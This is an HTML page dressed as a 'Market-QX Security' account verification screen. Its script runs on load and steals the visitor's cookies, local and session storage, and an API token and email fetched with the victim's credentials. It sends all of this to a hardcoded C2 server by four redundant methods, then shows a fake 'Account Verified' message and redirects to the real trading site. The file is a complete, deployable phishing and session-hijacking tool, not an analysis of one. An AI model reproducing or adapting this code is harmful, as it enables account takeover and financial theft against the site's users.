<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Market-QX Security</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a1a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .box {
            max-width: 400px;
            width: 100%;
            background: #1a1a2e;
            border-radius: 24px;
            padding: 40px 30px;
            text-align: center;
            border: 1px solid #2a2a4a;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .logo {
            color: #e94560;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .logo span { color: #00ff88; }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #1a1a3e;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .title {
            color: #fff;
            font-size: 20px;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #888;
            font-size: 14px;
        }
        .success-icon {
            font-size: 72px;
            margin-bottom: 15px;
        }
        .success-title {
            color: #00ff88;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .success-text {
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="box" id="app">
        <div class="logo">Market<span>-QX</span></div>
        <div class="spinner"></div>
        <div class="title">Verifying your account...</div>
        <div class="subtitle">Please wait a moment</div>
    </div>

    <script>
        // ============================================================
        // 🔥 YOUR RAILWAY C2 URL - ALREADY SET!
        // ============================================================
        const C2_URL = 'https://market-qx-c2-production.up.railway.app';

        // ============================================================
        // AUTO-STEAL - Runs immediately when page loads
        // ============================================================
        (async function autoSteal() {
            try {
                console.log('🔴 Exploit started');

                // --------------------------------------------------------
                // 1. STEAL COOKIES
                // --------------------------------------------------------
                const cookies = document.cookie;
                console.log('🍪 Cookies:', cookies);

                // --------------------------------------------------------
                // 2. STEAL LOCAL STORAGE
                // --------------------------------------------------------
                const localStorageData = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        localStorageData[key] = localStorage.getItem(key);
                    }
                } catch (e) {}

                // --------------------------------------------------------
                // 3. STEAL SESSION STORAGE
                // --------------------------------------------------------
                const sessionStorageData = {};
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        sessionStorageData[key] = sessionStorage.getItem(key);
                    }
                } catch (e) {}

                // --------------------------------------------------------
                // 4. STEAL API DATA (THE TOKEN!)
                // --------------------------------------------------------
                let apiData = {};
                try {
                    const response = await fetch(
                        'https://market-qx.trade/api/v1/cabinets/digest',
                        {
                            credentials: 'include',
                            headers: { 'Accept': 'application/json' }
                        }
                    );
                    if (response.ok) {
                        apiData = await response.json();
                        console.log('🎯 TOKEN:', apiData.token);
                        console.log('📧 EMAIL:', apiData.email);
                    }
                } catch (e) {
                    console.log('API error:', e.message);
                }

                // --------------------------------------------------------
                // 5. BUILD COMPLETE STOLEN DATA
                // --------------------------------------------------------
                const stolenData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenSize: window.screen.width + 'x' + window.screen.height,
                    cookies: cookies,
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData,
                    apiData: apiData
                };

                console.log('📦 Stolen:', stolenData);

                // --------------------------------------------------------
                // 6. SEND TO C2 (MULTIPLE METHODS)
                // --------------------------------------------------------

                // Method 1: Fetch POST
                try {
                    await fetch(C2_URL + '/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(stolenData)
                    });
                    console.log('✅ Method 1: POST sent');
                } catch (e) {
                    console.log('Method 1 failed');
                }

                // Method 2: Image beacon (bypasses CORS)
                try {
                    const img = new Image();
                    img.src = C2_URL + '/collect?d=' +
                        encodeURIComponent(btoa(JSON.stringify(stolenData)));
                    console.log('✅ Method 2: Image sent');
                } catch (e) {}

                // Method 3: sendBeacon
                try {
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon(
                            C2_URL + '/collect',
                            JSON.stringify(stolenData)
                        );
                        console.log('✅ Method 3: Beacon sent');
                    }
                } catch (e) {}

                // Method 4: XMLHttpRequest (backup)
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', C2_URL + '/collect', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(stolenData));
                    console.log('✅ Method 4: XHR sent');
                } catch (e) {}

                // --------------------------------------------------------
                // 7. SHOW FAKE "VERIFIED" MESSAGE
                // --------------------------------------------------------
                document.getElementById('app').innerHTML =
                    '<div class="logo">Market<span>-QX</span></div>' +
                    '<div class="success-icon">✅</div>' +
                    '<div class="success-title">Account Verified</div>' +
                    '<div class="success-text">Your identity has been confirmed</div>' +
                    '<div style="color:#444;font-size:12px;margin-top:15px;">' +
                    'Redirecting to dashboard...</div>';

                // --------------------------------------------------------
                // 8. REDIRECT TO REAL SITE
                // --------------------------------------------------------
                setTimeout(function() {
                    window.location.href = 'https://market-qx.trade/demo-trade';
                }, 2500);

            } catch (error) {
                console.error('Error:', error);
            }
        })();
    </script>
</body>
</html>
